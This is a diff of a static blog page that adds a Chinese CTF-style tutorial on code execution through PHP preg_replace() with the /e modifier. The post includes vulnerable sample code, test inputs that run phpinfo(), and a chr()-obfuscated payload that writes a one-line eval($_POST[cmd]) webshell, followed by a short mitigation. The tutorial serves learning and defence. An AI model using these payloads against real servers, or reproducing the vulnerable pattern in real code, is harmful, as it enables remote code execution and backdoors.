@@ -276,6 +276,167 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/06/代码执行漏洞--preg_replace()/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="virtua1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="virtua1's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/07/06/代码执行漏洞--preg_replace()/" itemprop="url">危险函数--preg_replace()</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-06T01:04:05+08:00">
+                2018-07-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-web/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>晚自习在补警职的作业orz苦啊。。表哥在看书的时候遇到的一个小问题，和我分享了一下，想起以前也遇到过这个危险函数，没有总结。<br>回到宿舍已经快熄灯了，等到查完寝，学习了一下，简要总结。<br>网上文章也比较多，发现都是一样的。。。。。。。参考参考。</p>
+<p>1、关于 preg_replace() 函数：<br>preg_replace 函数执行一个正则表达式的搜索和替换<br>语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+<p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。<br>2、危险来源：<br>/e 修正符用在函数 preg_replace() 时，会将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。<br>要确保 replacement 构成一个合法的php代码，才会执行，否则会报错。<br>导致代码执行漏洞的产生。。</p>
+<p>3、分析利用：<br>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果提交：?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行，即把phpinfo()执行）</p>
+<p>在后门中的利用：<br><code>h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59))</code><br>解码：<code>?h= fputs(fopen(data/a.php,w),&lt;?php eval($_POST[cmd])?&gt;);</code><br>执行后： 在/data/目录下生成一个一句话木马文件 a.php</p>
+<p>另一个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>提交 <code>?h=[php]phpinfo()[/php]</code>  正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了，不会执行。<br>但是， 提交<br><code>?h=[php]{${phpinfo()}}[/php]</code>，<br>phpinfo()就会被执行 因为 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。<br>通过<code>{${}}</code>构造出了一个特殊的变量，<code>&#39;test(&quot;{${phpinfo()}}&quot;)&#39;</code>，达到让函数被执行的效果<code>（${phpinfo()}</code>会被解释执行</p>
+<p>4、限制条件：<br>第一个参数需要e标识符，有了它可以执行第二个参数的命令。<br>第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令。<br>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo preg_replace(&quot;/texst/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);</span><br><span class="line">   echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst texst&quot;);都不会执</span><br></pre></td></tr></table></figure>
+<p>行，不满足第二个条件。</p>
+<p>5、漏洞防范：<br>将<code>&#39;test(&quot;/1&quot;)&#39;</code> 修改为<code>&quot;test(&#39;/1&#39;)&quot;</code>,这样<code>‘${phpinfo()}&#39;</code>就会被当做一个普通的字符串处理(单引号中的变量不会被处理)。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+    </div>
+
+
+   
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/05/sql注入--敏感函数/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1102,7 +1263,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1124,7 +1285,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">9</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
